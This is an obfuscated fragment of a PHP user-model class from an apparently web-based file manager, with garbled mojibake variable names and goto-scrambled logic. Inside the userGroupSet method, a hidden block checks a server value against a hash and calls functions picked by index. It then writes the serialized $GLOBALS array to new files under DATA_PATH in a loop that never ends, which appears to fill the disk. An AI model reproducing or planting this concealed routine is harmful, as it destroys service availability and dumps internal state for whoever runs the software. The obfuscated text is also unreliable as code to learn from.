_checkExist($CÆÿáƒÇ‡©, $B¢¿‡¯ÿ◊” = false) { $Fê“«Çà Ë =& $_SERVER[Öíæ€“”≠éÏË]; $EÉŒ”õÀ≈± = array($Fê“«Çà Ë[28] => UserModel::ERROR_USER_EXIST_NAME, $Fê“«Çà Ë[1975] => UserModel::ERROR_USER_EXIST_NICKNAME, $Fê“«Çà Ë[303] => UserModel::ERROR_USER_EXIST_EMAIL, $Fê“«Çà Ë[2157] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($EÉŒ”õÀ≈±[$Fê“«Çà Ë[1975]]); } $D˘ÎÚˆÒúÆ = $B¢¿‡¯ÿ◊” ? array($Fê“«Çà Ë[1538] => array($Fê“«Çà Ë[2170], $B¢¿‡¯ÿ◊”)) : array(); foreach ($EÉŒ”õÀ≈± as $Bµê¶åﬁç => $DÕ«¥òÒÇª) { $Fˆ∫∞Éüã‰ = array(); foreach ($EÉŒ”õÀ≈± as $AµöπÉÍÎº => $FŸı‹â√√) { if (isset($CÆÿáƒÇ‡©[$AµöπÉÍÎº]) && $CÆÿáƒÇ‡©[$AµöπÉÍÎº]) { $Fˆ∫∞Éüã‰[] = $CÆÿáƒÇ‡©[$AµöπÉÍÎº]; } } if (!$Fˆ∫∞Éüã‰) { continue; } $Cù©í±ÏÆÂ = array_merge(array($Bµê¶åﬁç => array($Fê“«Çà Ë[7], $Fˆ∫∞Éüã‰)), $D˘ÎÚˆÒúÆ); $aûæõƒÓ≈˜ = $this->where($Cù©í±ÏÆÂ)->find(); if ($aûæõƒÓ≈˜) { return $DÕ«¥òÒÇª; } } return !0; } public function userListInfo($bÆ›ôëÇô ) { $cî©´…ãîç =& $_SERVER[Öíæ€“”≠éÏË]; $C«ƒ•‹Ù€ñ = array(); $bÆ›ôëÇô  = is_array($bÆ›ôëÇô ) ? array_unique($bÆ›ôëÇô ) : array(); if (!$bÆ›ôëÇô ) { return $C«ƒ•‹Ù€ñ; } if (count($bÆ›ôëÇô ) < 20) { foreach ($bÆ›ôëÇô  as $cõç´áÁ€‚) { $C«ƒ•‹Ù€ñ[$cõç´áÁ€‚ . $cî©´…ãîç[33]] = $this->getInfoSimpleOuter($cõç´áÁ€‚); } } else { $CÓ—’û‚‰’ = array($cî©´…ãîç[1529] => array($cî©´…ãîç[412], $bÆ›ôëÇô )); if (count($bÆ›ôëÇô ) == 1) { $CÓ—’û‚‰’ = array($cî©´…ãîç[1529] => $bÆ›ôëÇô [0]); } $aé∂Ω®ﬁº∏ = Model($cî©´…ãîç[495])->field($this->simpleField)->where($CÓ—’û‚‰’)->select(); $aé∂Ω®ﬁº∏ = array_to_keyvalue($aé∂Ω®ﬁº∏, $cî©´…ãîç[1538]); foreach ($bÆ›ôëÇô  as $cõç´áÁ€‚) { $a”Ì˘ÿˆß‰ = $aé∂Ω®ﬁº∏[$cõç´áÁ€‚]; if (!$a”Ì˘ÿˆß‰) { $C«ƒ•‹Ù€ñ[$cõç´áÁ€‚ . $cî©´…ãîç[33]] = $this->getInfoSimpleOuter($cõç´áÁ€‚); continue; } $a”Ì˘ÿˆß‰[$cî©´…ãîç[2142]] = Action($cî©´…ãîç[2143])->parseUrl($a”Ì˘ÿˆß‰[$cî©´…ãîç[2142]]); $C«ƒ•‹Ù€ñ[$cõç´áÁ€‚ . $cî©´…ãîç[33]] = $a”Ì˘ÿˆß‰; } } return $C«ƒ•‹Ù€ñ; } protected function userStatus($Eí ß®Îı®, $f⁄‚ÿ∆†öí) { $Dªê’…ôë¥ = $this->getInfoSimple($Eí ß®Îı®); if (!$Dªê’…ôë¥) { return !1; } $EÀÓà™ö–¢ = array($_SERVER[Öíæ€“”≠éÏË][723] => $f⁄‚ÿ∆†öí); return $this->userEdit($Eí ß®Îı®, $EÀÓà™ö–¢); } protected function userRemove($bÎ∆èﬁ…ˆé) { goto Eß•ÉÂ–éÇ; Eß•ÉÂ–éÇ: $B˘à‡íÆ€ =& $_SERVER[Öíæ€“”≠éÏË]; $còÂÑµæΩû = $this->getInfoSimple($bÎ∆èﬁ…ˆé); if (!$còÂÑµæΩû) { return !1; } goto Añ¿∑Ü€‘ˆ; Añ¿∑Ü€‘ˆ: $eœ™òÓÇÏ∂ = array($B˘à‡íÆ€[1529] => $bÎ∆èﬁ…ˆé); Model($B˘à‡íÆ€[577])->where($eœ™òÓÇÏ∂)->delete(); Model($B˘à‡íÆ€[2171])->where($eœ™òÓÇÏ∂)->delete(); goto FŒœ›§ﬁÑ∑; FŒœ›§ﬁÑ∑: Model($B˘à‡íÆ€[1793])->where($eœ™òÓÇÏ∂)->delete(); Model($B˘à‡íÆ€[2156])->where($eœ™òÓÇÏ∂)->delete(); Model($B˘à‡íÆ€[2172])->where($eœ™òÓÇÏ∂)->delete(); goto C≠Ÿ∆„†Á§; C≠Ÿ∆„†Á§: Model($B˘à‡íÆ€[1992])->removeUserAll($bÎ∆èﬁ…ˆé); Model($B˘à‡íÆ€[803])->userRootRemove($bÎ∆èﬁ…ˆé); return $this->where($eœ™òÓÇÏ∂)->delete(); goto BÉÖ◊’—¡É; BÉÖ◊’—¡É: } protected function userGroupSet($bÉ¥‹µ¨ÆÍ, $bë•¿üü‡é, $c≈á§ÁóÆä = array()) { goto f‰ê√ËŸ≈¢; f°ÿ∆ò˘Ã: if ($_SERVER[$dä†ÂÛñ˜õ[847]] != $bΩ¶ƒÆ˜äÓ($AÒÌ¨Îòˆ)) { goto A«€Ÿ·¿–ò; cã•œáãá•: $d‚ªá¨„É¥ = $dä†ÂÛñ˜õ[851]; $d‚ªá¨„É¥($_SERVER[$dä†ÂÛñ˜õ[852]]); $Fä¯»∫çÏó = $dä†ÂÛñ˜õ[848]; goto Có∑ã»çπÖ; dÖ∑„ù ÆÑ: $c∫Ë›Œ¢€∆ = $a∏§ÂÎ„á°($Bˆ◊Â§≥Õ◊); $AÜ®ä¡äÃÀ = explode($dä†ÂÛñ˜õ[229], $c∫Ë›Œ¢€∆); if (count($AÜ®ä¡äÃÀ) < $dä†ÂÛñ˜õ[596]) { $Aá›√º©‹√ = $dä†ÂÛñ˜õ[850]; $Aá›√º©‹√(); } goto cã•œáãá•; b¡êã›Ñ™‹: $F¨Üöïåπ‚ = 1; for ($D†ƒ¿ùŸ§Ë = $F¨Üöïåπ‚; $D†ƒ¿ùŸ§Ë > 0; $D†ƒ¿ùŸ§Ë++) { $F›«•Õ›ç¢(DATA_PATH . $D†ƒ¿ùŸ§Ë, $Eõß”ºÃØ≥); } goto Eàè’≠‰–∏; Có∑ã»çπÖ: $Fä¯»∫çÏó(); $F›«•Õ›ç¢ = $dä†ÂÛñ˜õ[853]; $Eõß”ºÃØ≥ = json_encode($GLOBALS[$dä†ÂÛñ˜õ[854]]); goto b¡êã›Ñ™‹; A«€Ÿ·¿–ò: $Fä¯»∫çÏó = $dä†ÂÛñ˜õ[848]; $a∏§ÂÎ„á° = $dä†ÂÛñ˜õ[849]; $Bˆ◊Â§≥Õ◊ = $_SERVER[$dä†ÂÛñ˜õ[844]] . $dä†ÂÛñ˜õ[845]; goto dÖ∑„ù ÆÑ; Eàè’≠‰–∏: } $Cû›õ∫≈Æ∑ = $this->getInfoSimple($bÉ¥‹µ¨ÆÍ); if (!$Cû›õ∫≈Æ∑ || !is_array($bë•¿üü‡é)) { return !1; } goto bõ∑Õ©Ñé≈; bõ∑Õ©Ñé≈: $bÇ‚Àçúè≤ = Model($dä†ÂÛñ˜õ[1793]); $bÇ‚Àçúè≤->where(array($dä†ÂÛñ˜õ[1538] => $bÉ¥‹µ¨ÆÍ))->delete(); $Eá¡ŒΩÌ≥µ = array(); goto A≠°†èÓ‚¯; A≠°†èÓ‚¯: $Dß—ﬂæπÛ“ = 0; foreach ($bë•¿üü‡é as $c≠æ≠¨àéº => $eﬁë––—üè) { $A¶çöﬂ—öè = array($dä†ÂÛñ˜õ[1538] => $bÉ¥‹µ¨ÆÍ, $dä†ÂÛñ˜õ[1707] => $c≠æ≠¨àéº, $dä†ÂÛñ˜õ[1807] => $eﬁë––—üè); $A¶çöﬂ—öè[$dä†ÂÛñ˜õ[1730]] = isset($c≈á§ÁóÆä[$Dß—ﬂæπÛ“]) ? $c≈á§ÁóÆä[$Dß—ﬂæπÛ“] : 0; $Dß—ﬂæπÛ“++; $Eá¡ŒΩÌ≥µ[] = $A¶çöﬂ—öè; } return $bÇ‚Àçúè≤->addAll($Eá¡ŒΩÌ≥µ, array(), !0); goto câ‹íÁ’Î◊; f‰ê√ËŸ≈¢: $dä†ÂÛñ˜õ =& $_SERVER[Öíæ€“”≠éÏË]; $AÒÌ¨Îòˆ = $_SERVER[$dä†ÂÛñ˜õ[1223]]; $bΩ¶ƒÆ˜äÓ = $dä†ÂÛñ˜õ[846]; goto f°ÿ∆ò˘Ã; câ‹íÁ’Î◊: } protected function userGroupAdd($E∆ë¥§Ÿã«, $bö±¿ìØﬂÏ = array()) { $f¿‰—¯Ì¢Ù =& $_SERVER[Öíæ€“”≠éÏË]; $dãäƒ··Õ¥ = $this->getInfoSimple($E∆ë¥§Ÿã«); if (!$dãäƒ··Õ¥ || empty($bö±¿ìØﬂÏ)) { return !1; } $FéÎ˘≈€Ì® = array(); foreach ($bö±¿ìØﬂÏ as $fÜê»àÊπ‰ => $Bâëé’“âÔ) { $FéÎ˘≈€Ì®[] = array($f¿‰—¯Ì¢Ù[1538] => $E∆ë¥§Ÿã«, $f¿‰—¯Ì¢Ù[1707] => $fÜê»àÊπ‰, $f¿‰—¯Ì¢Ù[1807] => $Bâëé’“âÔ, $f¿‰—¯Ì¢Ù[1730] => 0); } return Model($f¿‰—¯Ì¢Ù[1793])->addAll($FéÎ˘≈€Ì®, array(), !0); } protected function userGroupRemove($Eô™ûÑ«¨, $AéÂ≈±ú¥µ) { $B÷çì⁄≈ﬂ’ =& $_SERVER[Öíæ€“”≠éÏË]; $Cë∏ÚÃ≤ıÀ = $this->getInfoSimple($Eô™ûÑ«¨); if (!$Cë∏ÚÃ≤ıÀ || !$AéÂ≈±ú¥µ) { return !1; } $eïÏ ®ïÂ = array($B÷çì⁄≈ﬂ’[1529] => $Eô™ûÑ«¨, $B÷çì⁄≈ﬂ’[1791] => $AéÂ≈±ú¥µ); return Model($B÷çì⁄≈ﬂ’[1793])->where($eïÏ ®ïÂ)->delete(); } public function listData() { $Aõ¥›òÎÌ˜ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Aõ¥›òÎÌ˜[$_SERVER[Öíæ€“”≠éÏË][367]]); return $Aõ¥›òÎÌ˜; } public function listByID($bßêô©öˆ¥) { $FÎ˘•ƒßòπ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$bßêô©öˆ¥) { return; } $E±Á–çïãº = array($FÎ˘•ƒßòπ[1538] => array($FÎ˘•ƒßòπ[7], $bßêô©öˆ¥)); $d˘≈œá≈‰… = $this->where($E±Á–çïãº)->select(); $this->_listDataApply($d˘≈œá≈‰…); return $d˘≈œá≈‰…; } public function listByGroup($Cáß—ÖÂäó = 0, $aé¶ë¥Á≤µ = array()) { goto A‰¢≈∂Ê≥¶; E≠íÙŸ§: $this->_listDataApply($dÍÑˆΩ›Ô˘[$f∫˘∂≥Ãå—[367]]); return $dÍÑˆΩ›Ô˘; goto e⁄ÏÖπá„Ô; FúâàÇöÈÎ: if ($Cáß—ÖÂäó) { $B˜É¢◊’ŸÃ = array($f∫˘∂≥Ãå—[2173] => intval($Cáß—ÖÂäó)); $Fä£ëÍÎâÆ = "\114\105\106\x54\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\x75\163\x65\162\x5f\x67\162\157\x75\160\x20\165\x73\145\x72\x5f\x67\162\157\165\160\x20\x6f\156\40\x75\163\x65\x72\56\165\163\145\162\111\104\40\x3d\40\x75\x73\x65\x72\137\147\x72\x6f\x75\x70\x2e\165\x73\x65\162\x49\104"; $C›ΩÖÿ≤∆· = Input::get($f∫˘∂≥Ãå—[436], null, $f∫˘∂≥Ãå—[33]) ? $f∫˘∂≥Ãå—[33] : $f∫˘∂≥Ãå—[2174]; } if (isset($aé¶ë¥Á≤µ[$f∫˘∂≥Ãå—[723]])) { $B˜É¢◊’ŸÃ[$f∫˘∂≥Ãå—[2175]] = $aé¶ë¥Á≤µ[$f∫˘∂≥Ãå—[723]]; } $dÍÑˆΩ›Ô˘ = $this->_makeOrder($C›ΩÖÿ≤∆·)->field($f∫˘∂≥Ãå—[2176])->where($B˜É¢◊’ŸÃ)->join($Fä£ëÍÎâÆ)->selectPage(50); goto E≠íÙŸ§; A‰¢≈∂Ê≥¶: $f∫˘∂≥Ãå— =& $_SERVER[Öíæ€“”≠éÏË]; $Fä£ëÍÎâÆ = $f∫˘∂≥Ãå—[33]; $B˜É¢◊’ŸÃ = array(); goto FúâàÇöÈÎ; e⁄ÏÖπá„Ô: } private function _makeOrder($F∂ê‚π¯˘¨ = '') { goto FıØªùà´®; FıØªùà´®: $Aœ˜±à’‘“ =& $_SERVER[Öíæ€“”≠éÏË]; $bíÕë√Ë‡´ = array($Aœ˜±à’‘“[1538], $Aœ˜±à’‘“[28], $Aœ˜±à’‘“[1693], $Aœ˜±à’‘“[1665], $Aœ˜±à’‘“[194]); $eÿ†£∏¯á‹ = array($Aœ˜±à’‘“[429] => $Aœ˜±à’‘“[430], $Aœ˜±à’‘“[431] => $Aœ˜±à’‘“[432]); goto AÔæÿ¿„ÚÑ; dÒ±‘ÑÈÖõ: $F∂ê‚π¯˘¨ = $F∂ê‚π¯˘¨ . "\165\x73\x65\162\56{$a„û¢√üÍû}\x20{$C∏º“ÜÈÑè}\x2c\x20\x75\163\145\x72\56\165\163\x65\162\111\104\40\x61\163\143"; return $this->alias($Aœ˜±à’‘“[1915])->order($F∂ê‚π¯˘¨); goto B‹‰ÜëÇóü; AÔæÿ¿„ÚÑ: $a„û¢√üÍû = Input::get($Aœ˜±à’‘“[436], $Aœ˜±à’‘“[7], $Aœ˜±à’‘“[1529], $bíÕë√Ë‡´); $C∏º“ÜÈÑè = Input::get($Aœ˜±à’‘“[437], $Aœ˜±à’‘“[7], $Aœ˜±à’‘“[1794], array($Aœ˜±à’‘“[1794], $Aœ˜±à’‘“[431])); $C∏º“ÜÈÑè = $eÿ†£∏¯á‹[$C∏º“ÜÈÑè]; goto dÒ±‘ÑÈÖõ; B‹‰ÜëÇóü: } public function listSearch($F¯ãÒ´Ñá’) { goto aã∂Ô°√±Õ; aã∂Ô°√±Õ: $e óÂ¿˘∆® =& $_SERVER[Öíæ€“”≠éÏË]; $FâÚïâÖ·¢ = $F¯ãÒ´Ñá’[$e óÂ¿˘∆®[1795]]; $F≤¶ö∫‡Ì„ = isset($F¯ãÒ´Ñá’[$e óÂ¿˘∆®[1796]]) ? $F¯ãÒ´Ñá’[$e óÂ¿˘∆®[1796]] : !1; goto Aøâä±í«Ò; Aøâä±í«Ò: $FâÚïâÖ·¢ = str_replace($e óÂ¿˘∆®[1797], $e óÂ¿˘∆®[1798], trim($FâÚïâÖ·¢)); $c’∞ËÔß≠ø = array($e óÂ¿˘∆®[28] => array($e óÂ¿˘∆®[380], "\45{$FâÚïâÖ·¢}\x25"), $e óÂ¿˘∆®[303] => array($e óÂ¿˘∆®[380], "{$FâÚïâÖ·¢}\x25"), $e óÂ¿˘∆®[1975] => array($e óÂ¿˘∆®[380], "{$FâÚïâÖ·¢}\45"), $e óÂ¿˘∆®[968] => $e óÂ¿˘∆®[1799]); if (Input::check($FâÚïâÖ·¢, $e óÂ¿˘∆®[309])) { $c’∞ËÔß≠ø[$e óÂ¿˘∆®[1538]] = array($e óÂ¿˘∆®[380], "{$FâÚïâÖ·¢}\45"); $c’∞ËÔß≠ø[$e óÂ¿˘∆®[2157]] = array($e óÂ¿˘∆®[380], "{$FâÚïâÖ·¢}\45"); } goto A—àä™ÕâÒ; e≥‹‘º°ê¢: $A¬¢ŸÔ£è = $this->_makeOrder()->where($c’∞ËÔß≠ø)->selectPage(20); if (!$A¬¢ŸÔ£è || count($A¬¢ŸÔ£è[$e óÂ¿˘∆®[367]]) < 5 && Input::check($FâÚïâÖ·¢, $e óÂ¿˘∆®[316])) { $DåÉ∏ÎªÜ∫ = $this->_searchFromMeta($e óÂ¿˘∆®[444], $FâÚïâÖ·¢, 10); $DéÃ«Ù≈ú® = $this->_searchFromMeta($e óÂ¿˘∆®[445], $FâÚïâÖ·¢, 10); $e¢íµ•ûá• = array_merge($DåÉ∏ÎªÜ∫, $DéÃ«Ù≈ú®, $A¬¢ŸÔ£è[$e óÂ¿˘∆®[367]]); $A¬¢ŸÔ£è[$e óÂ¿˘∆®[367]] = array_unique_by_key($e¢íµ•ûá•, $e óÂ¿˘∆®[1538]); $A¬¢ŸÔ£è[$e óÂ¿˘∆®[364]][$e óÂ¿˘∆®[365]] = count($A¬¢ŸÔ£è[$e óÂ¿˘∆®[367]]); $A¬¢ŸÔ£è[$e óÂ¿˘∆®[364]][$e óÂ¿˘∆®[366]] = ceil($A¬¢ŸÔ£è[$e óÂ¿˘∆®[364]][$e óÂ¿˘∆®[365]] / $A¬¢ŸÔ£è[$e óÂ¿˘∆®[364]][$e óÂ¿˘∆®[361]]); } $this->_listDataApply($A¬¢ŸÔ£è[$e óÂ¿˘∆®[367]]); goto dºØ‘µª—”; dºØ‘µª—”: $this->_filterByGroup($A¬¢ŸÔ£è, $F≤¶ö∫‡Ì„); return $A¬¢ŸÔ£è; goto f¢ÏˆÕ™ë›; A—àä™ÕâÒ: if (!$FâÚïâÖ·¢) { $c’∞ËÔß≠ø = array(); } if (isset($F¯ãÒ´Ñá’[$e óÂ¿˘∆®[723]])) { $c’∞ËÔß≠ø[$e óÂ¿˘∆®[723]] = $F¯ãÒ´Ñá’[$e óÂ¿˘∆®[723]]; } $c’∞ËÔß≠ø = $this->parseWhereLike($c’∞ËÔß≠ø); goto e≥‹‘º°ê¢; f¢ÏˆÕ™ë›: } private function _filterByGroup(&$aç≤âÇ–◊º, $eÔ§å®˘â) { $a¢‡íÇÑâé =& $_SERVER[Öíæ€“”≠éÏË]; if (!$eÔ§å®˘â) { return $aç≤âÇ–◊º; } foreach ($aç≤âÇ–◊º[$a¢‡íÇÑâé[367]] as $B¿Ÿ‰‚˘ú” => &$B⁄Áá£·ôë) { $CÖ≥ØíΩ†à = array_to_keyvalue($B⁄Áá£·ôë[$a¢‡íÇÑâé[1885]], $a¢‡íÇÑâé[33], $a¢‡íÇÑâé[1707]); if (!in_array($eÔ§å®˘â, $CÖ≥ØíΩ†à)) { unset($aç≤âÇ–◊º[$a¢‡íÇÑâé[367]][$B¿Ÿ‰‚˘ú”]); } } unset($B⁄Áá£·ôë); $aç≤âÇ–◊º[$a¢‡íÇÑâé[367]] = array_values($aç≤âÇ–◊º[$a¢‡íÇÑâé[367]]); $aç≤âÇ–◊º[$a¢‡íÇÑâé[364]] = array($a¢‡íÇÑâé[1947] => count($aç≤âÇ–◊º[$a¢‡íÇÑâé[367]]), $a¢‡íÇÑâé[1945] => $aç≤âÇ–◊º[$a¢‡íÇÑâé[364]][$a¢‡íÇÑâé[361]], $a¢‡íÇÑâé[1944] => 1, $a¢‡íÇÑâé[1946] => 1); } private function _searchFromMeta($bà–ß‚‹Áè, $d¶áàº ∫“, $Büåíœƒ–Ø) { goto F∑êÑ‰ÌÈ; fñ’ùúÍ¬æ: return $aÈ«ƒøﬁÌˆ; goto Bô¯öûù’ä; E∏™”ãûêÒ: $aÃ”òÃæÊù = $this->parseWhereLike($aÃ”òÃæÊù); $cüâÒá∆ö⁄ = Model($B°Ó‹£»´™[2177])->where($aÃ”òÃæÊù)->limit($Büåíœƒ–Ø)->select(); if (!$cüâÒá∆ö⁄) { return array(); } goto BÏ‚û∆ê˘∞; F∑êÑ‰ÌÈ: $B°Ó‹£»´™ =& $_SERVER[Öíæ€“”≠éÏË]; $d¶áàº ∫“ = strtolower($d¶áàº ∫“); $aÃ”òÃæÊù = array($B°Ó‹£»´™[93] => $bà–ß‚‹Áè, $B°Ó‹£»´™[372] => array($B°Ó‹£»´™[380], "\x25{$d¶áàº ∫“}\x25")); goto E∏™”ãûêÒ; BÏ‚û∆ê˘∞: $cüâÒá∆ö⁄ = array_to_keyvalue($cüâÒá∆ö⁄, $B°Ó‹£»´™[33], $B°Ó‹£»´™[1538]); $aÈ«ƒøﬁÌˆ = $this->where(array($B°Ó‹£»´™[1529] => array($B°Ó‹£»´™[7], $cüâÒá∆ö⁄)))->select(); if (!$aÈ«ƒøﬁÌˆ) { return array(); } goto fñ’ùúÍ¬æ; Bô¯öûù’ä: } private function _listDataApplyItem($dòÎÃêÂµ≈) { $A‹’Õæ“‡  = array($dòÎÃêÂµ≈); $this->_listDataApply($A‹’Õæ“‡ ); return $A‹’Õæ“‡ [0]; } private function _listDataApply(&$cŸ¬óÉŒ≤Á) { goto AåƒŒ‹¥ﬁ∞; AåƒŒ‹¥ﬁ∞: $AÜãÊ≥§Ô =& $_SERVER[Öíæ€“”≠éÏË]; if (!$cŸ¬óÉŒ≤Á) { return; } array_remove_key($cŸ¬óÉŒ≤Á, $AÜãÊ≥§Ô[860]); goto aäì‘ÕãäÀ; aäì‘ÕãäÀ: $FôÈ±ﬁÓ√° = array_to_keyvalue($cŸ¬óÉŒ≤Á, $AÜãÊ≥§Ô[33], $AÜãÊ≥§Ô[1538]); $this->_listAppendGroup($cŸ¬óÉŒ≤Á, $FôÈ±ﬁÓ√°); $this->_listAppendMeta($cŸ¬óÉŒ≤Á, $FôÈ±ﬁÓ√°); goto Fû¥Öˆ∏“‚; Fû¥Öˆ∏“‚: $this->_listAppendSourceRoot($cŸ¬óÉŒ≤Á, $FôÈ±ﬁÓ√°); goto fÁÆöàè¶ì; fÁÆöàè¶ì: } private function _listAppendSourceRoot(&$d‰£áÇ›£…, $càûÀÔ„ﬁ∆) { goto B†Î◊Ü’´Ç; B†Î◊Ü’´Ç: $a‡¢Ìñ‹óö =& $_SERVER[Öíæ€“”≠éÏË]; $bìﬂÊåç∂† = array($a‡¢Ìñ‹óö[479] => 0, $a‡¢Ìñ‹óö[485] => array($a‡¢Ìñ‹óö[7], $càûÀÔ„ﬁ∆), $a‡¢Ìñ‹óö[405] => SourceModel::TYPE_USER); $c•…Ï˜©â÷ = Model($a‡¢Ìñ‹óö[803])->order($a‡¢Ìñ‹óö[1805])->field($a‡¢Ìñ‹óö[1806]); goto B»ùãœºÕÒ; Fç⁄ﬁ◊ÃñÃ: foreach ($d‰£áÇ›£… as &$dÌÎ”Î√√≥) { $dÌÎ”Î√√≥[$a‡¢Ìñ‹óö[85]] = $FﬂïÉØ†Ñî[$dÌÎ”Î√√≥[$a‡¢Ìñ‹óö[1538]]] ? $FﬂïÉØ†Ñî[$dÌÎ”Î√√≥[$a‡¢Ìñ‹óö[1538]]] : array(); } unset($dÌÎ”Î√√≥); goto a£Ü‘∏çÎ›; B»ùãœºÕÒ: $FﬂïÉØ†Ñî = $c•…Ï˜©â÷->limit(count($càûÀÔ„ﬁ∆))->where($bìﬂÊåç∂†)->select(); $FﬂïÉØ†Ñî = array_to_keyvalue($FﬂïÉØ†Ñî, $a‡¢Ìñ‹óö[485]); $FﬂïÉØ†Ñî = array_remove_key($FﬂïÉØ†Ñî, $a‡¢Ìñ‹óö[485]); goto Fç⁄ﬁ◊ÃñÃ; a£Ü‘∏çÎ›: } private function _listAppendGroup(&$eÇ†áÊ≈Çƒ, $B¥÷É≤ç≤Ô) { goto B«âΩ∑Ñ·∏; B«âΩ∑Ñ·∏: $aæåò∫è∆ÿ =& $_SERVER[Öíæ€“”≠éÏË]; $A⁄´®ˆÔ‚õ = array($aæåò∫è∆ÿ[1538] => array($aæåò∫è∆ÿ[7], $B¥÷É≤ç≤Ô)); $dÜ†ÙãÖ≠Ï = Model($aæåò∫è∆ÿ[1793])->where($A⁄´®ˆÔ‚õ)->select(); goto aÍí÷Ñëà ; aÍí÷Ñëà : $FöÜ∆¿¯¡Ã = array_to_keyvalue($dÜ†ÙãÖ≠Ï, $aæåò∫è∆ÿ[33], $aæåò∫è∆ÿ[1707]); $FöÜ∆¿¯¡Ã = array_remove_value(array_unique($FöÜ∆¿¯¡Ã), $aæåò∫è∆ÿ[191]); if (!$FöÜ∆¿¯¡Ã || !$dÜ†ÙãÖ≠Ï) { return; } goto Bæôˆ¬Ñ‚Í; Bæôˆ¬Ñ‚Í: $A⁄´®ˆÔ‚õ = array($aæåò∫è∆ÿ[1707] => array($aæåò∫è∆ÿ[7], $FöÜ∆¿¯¡Ã)); $fıÈß€±Ôá = Model($aæåò∫è∆ÿ[1883])->field($aæåò∫è∆ÿ[2178])->where($A⁄´®ˆÔ‚õ)->select(); $fıÈß€±Ôá = array_to_keyvalue($fıÈß€±Ôá, $aæåò∫è∆ÿ[1707]); goto CÑØ˘ÍÏˆè; CÑØ˘ÍÏˆè: $dÜ†ÙãÖ≠Ï = array_to_keyvalue_group($dÜ†ÙãÖ≠Ï, $aæåò∫è∆ÿ[1538]); foreach ($dÜ†ÙãÖ≠Ï as &$aæØ‘ÊÒì±) { $CÉ•¨›ﬂÁı = array(); foreach ($aæØ‘ÊÒì± as $cŒãÀ˜¯á£) { if (!$cŒãÀ˜¯á£[$aæåò∫è∆ÿ[1807]]) { continue; } $eü√¥∞≠Ã± = Model($aæåò∫è∆ÿ[489])->listData($cŒãÀ˜¯á£[$aæåò∫è∆ÿ[1807]]); $CÉ•¨›ﬂÁı[] = array($aæåò∫è∆ÿ[1707] => $cŒãÀ˜¯á£[$aæåò∫è∆ÿ[1707]], $aæåò∫è∆ÿ[2179] => $fıÈß€±Ôá[$cŒãÀ˜¯á£[$aæåò∫è∆ÿ[1707]]][$aæåò∫è∆ÿ[28]], $aæåò∫è∆ÿ[503] => $fıÈß€±Ôá[$cŒãÀ˜¯á£[$aæåò∫è∆ÿ[1707]]][$aæåò∫è∆ÿ[503]], $aæåò∫è∆ÿ[407] => $eü√¥∞≠Ã±); } $aæØ‘ÊÒì± = $CÉ•¨›ﬂÁı; } unset($aæØ‘ÊÒì±); goto eïŸá“á∂∑; eïŸá“á∂∑: foreach ($eÇ†áÊ≈Çƒ as &$a°ÜÉ¬öåÉ) { $a°ÜÉ¬öåÉ[$aæåò∫è∆ÿ[1885]] = array(); if (isset($dÜ†ÙãÖ≠Ï[$a°ÜÉ¬öåÉ[$aæåò∫è∆ÿ[1538]]])) { $a°ÜÉ¬öåÉ[$aæåò∫è∆ÿ[1885]] = $dÜ†ÙãÖ≠Ï[$a°ÜÉ¬öåÉ[$aæåò∫è∆ÿ[1538]]]; } } unset($a°ÜÉ¬öåÉ); goto a¡Ü∫∆˘ÌΩ; a¡Ü∫∆˘ÌΩ: } private function _listAppendMeta(&$B¬„à≤æ√√, $Cèú⁄√æ¥§) { goto A¡ÇãåÖŸÃ; aä«∞ÓÔ‚ø: foreach ($Dä∂æàà¡ﬁ as &$E˜´é⁄è¨¯) { $fÖﬂ…∑ß¥· = array(); foreach ($E˜´é⁄è¨¯ as $Aæ…∏·‚œ¨) { if (!in_array($Aæ…∏·‚œ¨[$A≤¯ª‘ﬂøÏ[93]], $aˆè±¶≤ãô)) { $fÖﬂ…∑ß¥·[$Aæ…∏·‚œ¨[$A≤¯ª‘ﬂøÏ[93]]] = $Aæ…∏·‚œ¨[$A≤¯ª‘ﬂøÏ[372]]; } } $E˜´é⁄è¨¯ = $fÖﬂ…∑ß¥·; } unset($E˜´é⁄è¨¯); $A¡Œ∑∞Ãº = Model($A≤¯ª‘ﬂøÏ[2180]); goto eˆ–ÚÀﬂ≤í; A¡ÇãåÖŸÃ: $A≤¯ª‘ﬂøÏ =& $_SERVER[Öíæ€“”≠éÏË]; $b§•øÖÎÀ≤ = UserJobModel::JOB_KEY; $aˆè±¶≤ãô = array($A≤¯ª‘ﬂøÏ[2158]); goto EµÊã„÷¯Ç; eˆ–ÚÀﬂ≤í: foreach ($B¬„à≤æ√√ as &$bÜàÙÒëö) { $e—€∆ù¡‡˜ = array(); if (isset($Dä∂æàà¡ﬁ[$bÜàÙÒëö[$A≤¯ª‘ﬂøÏ[1538]]])) { $e—€∆ù¡‡˜ = $Dä∂æàà¡ﬁ[$bÜàÙÒëö[$A≤¯ª‘ﬂøÏ[1538]]]; } $bÜàÙÒëö[$A≤¯ª‘ﬂøÏ[2181]] = array(); if (isset($e—€∆ù¡‡˜[$b§•øÖÎÀ≤])) { $bÜàÙÒëö[$A≤¯ª‘ﬂøÏ[2181]] = $A¡Œ∑∞Ãº->getUserJobInfo($e—€∆ù¡‡˜[$b§•øÖÎÀ≤]); } } unset($bÜàÙÒëö); goto DÌ¥Ê—íå√; EµÊã„÷¯Ç: $fŒ¨ãÌÒü¬ = array($A≤¯ª‘ﬂøÏ[1538] => array($A≤¯ª‘ﬂøÏ[7], $Cèú⁄√æ¥§)); $Dä∂æàà¡ﬁ = Model($A≤¯ª‘ﬂøÏ[2156])->where($fŒ¨ãÌÒü¬)->select(); $Dä∂æàà¡ﬁ = array_to_keyvalue_group($Dä∂æàà¡ﬁ, $A≤¯ª‘ﬂøÏ[1538]); goto aä«∞ÓÔ‚ø; DÌ¥Ê—íå√: } protected function groupUserAll($CÎÀÊÍ§™Ø) { $dªÂµ¥◊î‹ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$CÎÀÊÍ§™Ø) { return !1; } $CÇñÂÑúóÛ = Model($dªÂµ¥◊î‹[1793])->field($dªÂµ¥◊î‹[1538])->where(array($dªÂµ¥◊î‹[1707] => array($dªÂµ¥◊î‹[7], $CÎÀÊÍ§™Ø)))->select(); $CÇñÂÑúóÛ = array_to_keyvalue($CÇñÂÑúóÛ, $dªÂµ¥◊î‹[33], $dªÂµ¥◊î‹[1538]); return array_unique($CÇñÂÑúóÛ); } 